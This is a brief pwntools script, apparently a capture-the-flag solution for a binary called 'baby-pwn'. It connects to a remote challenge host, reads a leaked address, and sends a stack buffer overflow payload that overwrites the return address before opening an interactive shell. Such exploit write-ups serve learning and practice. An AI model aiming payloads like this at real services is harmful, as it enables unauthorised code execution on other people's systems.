#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./baby-pwn')

#p = process()
p = remote('34.162.142.123', 5000)

p.recvuntil(b'secret: ')
secret = int(p.recvline()[:-1],16) 
p.sendline(b'a'*0x40 + p64(0) + p64(secret))
p.interactive()
